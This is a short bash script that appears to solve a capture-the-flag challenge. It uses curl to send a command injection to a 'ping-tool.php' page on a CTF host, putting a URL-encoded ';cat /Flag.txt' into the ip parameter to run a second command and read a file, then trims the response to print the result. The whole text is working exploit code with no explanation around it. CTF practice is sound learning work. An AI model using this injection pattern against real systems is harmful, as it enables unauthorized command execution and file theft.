#! /bin/bash

curl 'http://ctf.ryanic.com:8080/ping-tool.php?ip=%3Bcat+%2FFlag.txt' 2>/dev/null | cut -d ' ' -f2
